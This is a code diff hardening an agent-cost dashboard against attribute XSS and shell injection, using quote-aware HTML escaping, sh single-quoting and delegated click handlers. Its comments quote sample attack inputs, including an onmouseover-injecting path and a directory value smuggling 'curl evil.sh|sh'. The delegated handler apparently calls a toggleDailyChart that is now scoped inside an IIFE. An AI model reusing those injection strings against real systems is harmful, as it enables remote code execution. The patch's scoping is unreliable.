@@ -1,5 +1,38 @@
 // Dashboard rendering and interactions.
-// Data is injected by cost_dashboard.py as window.dashboardData.
+// Data is injected by the Go template as window.dashboardData.
+
+// Escapes a value for HTML, in a text node and in a quoted attribute alike.
+//
+// This used to round-trip through a detached element's innerHTML, which escapes
+// & < > and nothing else. Every value that reaches a title= or a data- attribute
+// is attacker-influenced — project paths, model names and session titles are all
+// read out of agent logs — so leaving " and ' intact let a crafted log close the
+// attribute and add its own. A project path of
+//
+//     /tmp/evil" onmouseover="window.__xss1=1
+//
+// rendered as `<td class="project-name" title="/tmp/evil" onmouseover="…">`: a
+// live event handler, not an escaped string. There is no element injection to
+// worry about, since < > are escaped, but a handler is enough — and this page is
+// built around hover tooltips, so onmouseover fires on ordinary use.
+//
+// Both quotes are escaped, plus the backtick, so a value is also inert if it is
+// ever interpolated into a JS string or a template literal. This is defined
+// before the render IIFEs below because those run at load, and a `const` further
+// down the file would be in its temporal dead zone when they call it.
+const HTML_ESCAPES = {
+    '&': '&amp;',
+    '<': '&lt;',
+    '>': '&gt;',
+    '"': '&quot;',
+    "'": '&#39;',
+    '`': '&#96;',
+};
+
+function escapeHtml(text) {
+    return String(text == null ? '' : text).replace(/[&<>"'`]/g, ch => HTML_ESCAPES[ch]);
+}
+
 const dashboardData = window.dashboardData || {};
 
 (function() {
@@ -141,7 +174,7 @@ const dashboardData = window.dashboardData || {};
                 ? 'Show last 14 days'
                 : `Show all ${totalDays} days`;
             html += `<div style="margin-top:12px;text-align:center">
-                <button onclick="toggleDailyChart()" class="copy-btn">${label}</button>
+                <button data-toggle-daily-chart class="copy-btn">${label}</button>
             </div>`;
         }
 
@@ -174,25 +207,54 @@ const dashboardData = window.dashboardData || {};
             </div>`;
     }
 
-    window.toggleDailyChart = function() {
+    function toggleDailyChart() {
         showAll = !showAll;
         render();
-    };
+    }
 
     render();
 })();
 
 const projects = dashboardData.projects || [];
 
+// Single-quotes a value for sh.
+//
+// Every character is inert inside '...', including the double quote that the
+// old construction relied on: a double-quoted string ends at the first " in it,
+// so a working directory of
+//
+//	/x" ; curl evil.sh|sh ; "
+//
+// closed the cd argument and everything after it was a second command. The
+// only character that ends a single-quoted string is a single quote itself, and
+// the usual way out of that is to end the quote, emit an escaped quote, and
+// reopen: '\''. That is the one construction to get right here, so it is the
+// only one.
+//
+// agentCmd is not log-derived — it is the agent id, one of a fixed set the
+// scanner assigns per source — but it is quoted like the rest, because a
+// command position is exactly the wrong place to trust that.
+function shQuote(value) {
+    return "'" + String(value == null ? '' : value).replace(/'/g, "'\\''") + "'";
+}
+
+// The resume command the Copy button hands over.
+//
+// This is a command line, so it is quoted for sh rather than escaped for HTML:
+// the two are unrelated and the button vouches for the result. Note that HTML
+// escaping of the surrounding data- attribute is a second, independent
+// requirement — escapeHtml still guards the attribute this ends up in.
 function buildResumeCmd(agentCmd, cwd, sessionPath, sessionUid) {
+    const cwdArg = shQuote(cwd);
     if (agentCmd === 'claude') {
-        return 'cd "' + cwd + '" && claude --resume "' + sessionUid + '"';
+        return 'cd ' + cwdArg + ' && ' + shQuote('claude') + ' --resume ' + shQuote(sessionUid);
     } else if (agentCmd === 'codex') {
-        return 'cd "' + cwd + '" && codex --resume "' + sessionUid + '"';
+        return 'cd ' + cwdArg + ' && ' + shQuote('codex') + ' --resume ' + shQuote(sessionUid);
     } else if (agentCmd === 'agy') {
-        return 'cd "' + cwd + '" && agy --conversation "' + sessionUid + '"';
+        return 'cd ' + cwdArg + ' && ' + shQuote('agy') + ' --conversation ' + shQuote(sessionUid);
     } else {
-        return 'cd "' + cwd + '" && ' + agentCmd + ' --session "' + sessionPath + '"';
+        return 'cd ' + cwdArg + ' && ' + shQuote(agentCmd) +
+            ' --session ' + shQuote(sessionPath);
     }
 }
 
@@ -218,12 +280,6 @@ let sessionsSort = { field: 'start', asc: false };
 // multi-megabyte DOM for no benefit until someone scrolls to it.
 const SESSIONS_PAGE_SIZE = 50;
 let sessionsPage = 0;
-
-function escapeHtml(text) {
-    const div = document.createElement('div');
-    div.textContent = text;
-    return div.innerHTML;
-}
 
 // Column counts per table. The header row in the template and the cells each
 // renderer emits are asserted against these by the Go test, so the two cannot
@@ -397,7 +453,7 @@ function renderProjects() {
         `).join('');
 
         return `
-            <tr class="expandable-row" data-target="${rowId}" onclick="toggleProjectRow('${rowId}')">
+            <tr class="expandable-row" data-toggle-project="${rowId}">
                 <td class="project-name" title="${escapeHtml(p.name)}"><span class="expand-icon">▶</span> ${escapeHtml(shortName)}</td>
                 <td>${p.sessions}</td>
                 <td title="${formatFullNumber(p.messages)}">${formatCompactNumber(p.messages)}</td>
@@ -423,9 +479,9 @@ function renderProjects() {
     }).join('');
 }
 
-function toggleProjectRow(rowId) {
+function toggleProjectRow(rowId, trigger) {
     const row = document.getElementById(rowId);
-    const parentRow = document.querySelector('[data-target="' + rowId + '"]');
+    const parentRow = trigger || document.querySelector('[data-toggle-project="' + rowId + '"]');
     row.classList.toggle('show');
     parentRow.classList.toggle('expanded');
 }
@@ -508,7 +564,7 @@ function renderSessions() {
                 <td class="tokens">${tokenCellHtml(s)}</td>
                 <td class="cost">$${s.cost.toFixed(2)}</td>
                 <td>
-                    <button onclick="copyResumeCommand(event, this.dataset.resumeCmd)" data-resume-cmd="${escapeHtml(resumeCmd)}" class="icon-btn" title="Copy resume command">Copy</button>
+                    <button data-copy-resume data-resume-cmd="${escapeHtml(resumeCmd)}" class="icon-btn" title="Copy resume command">Copy</button>
                     ${s.orphaned
                     ? '<span class="model-stat" title="This session\'s log is no longer on disk; its figures are kept" style="cursor:default">Log gone</span>'
                     : `<a href="${sessionUrl}" class="session-link" target="_blank" title="View full session">Open \u2192</a>`}
@@ -520,8 +576,10 @@ function renderSessions() {
     tbody.innerHTML = html;
 }
 
-function copyResumeCommand(event, cmd) {
-    const btn = event.target;
+// The button is passed in rather than taken from the event: the delegate below
+// already resolves it, and event.target can be a text node inside the label.
+function copyResumeCommand(btn) {
+    const cmd = btn.dataset.resumeCmd || '';
 
     function showSuccess() {
         const originalText = btn.textContent;
@@ -584,6 +642,36 @@ function setupSessionsToolbar() {
     next?.addEventListener('click', () => {
         sessionsPage += 1;
         renderSessions();
+    });
+}
+
+// Every clickable cell is wired by delegation from a data- attribute rather than
+// by an inline onclick. Two reasons, one of them security: an inline handler is
+// a script block that a Content-Security-Policy can only allow with
+// 'unsafe-inline', which would also allow a handler an injected attribute
+// managed to add; and it puts a value inside a JS string inside an HTML
+// attribute, which is a quoting problem waiting for the first value with a
+// quote in it. The id passed to the handlers is generated here rather than read
+// from a log, but the data- attribute costs nothing and keeps that true.
+function setupDelegatedActions() {
+    document.addEventListener('click', event => {
+        const btn = event.target.closest('[data-copy-resume]');
+        if (btn) {
+            copyResumeCommand(btn);
+            return;
+        }
+        if (event.target.closest('[data-toggle-daily-chart]')) {
+            toggleDailyChart();
+            return;
+        }
+        if (event.target.closest('[data-reload]')) {
+            location.reload();
+            return;
+        }
+        const row = event.target.closest('[data-toggle-project]');
+        if (row) {
+            toggleProjectRow(row.dataset.toggleProject, row);
+        }
     });
 }
 
@@ -721,6 +809,7 @@ function renderTools() {
 }
 
 // Setup
+setupDelegatedActions();
 setupSessionsToolbar();
 setupSorting('projects-table', projectSort, renderProjects);
 setupSorting('sessions-table', sessionsSort, renderSessions);
